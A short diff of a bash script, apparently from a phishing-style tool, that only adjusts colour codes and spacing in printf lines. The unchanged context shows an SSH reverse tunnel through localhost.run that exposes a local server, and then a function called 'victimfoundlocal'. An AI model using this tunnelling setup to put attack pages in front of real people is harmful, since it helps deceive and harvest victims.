@@ -260,9 +260,9 @@ banner
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Stop Tunnelling.\e[0m\n"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m'
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m '
 ssh -R 80:localhost:$local_port ssh.localhost.run
-printf "\n"
+printf "\e[0m\n"
 victimfoundlocal
 }
 victimfoundlocal() {
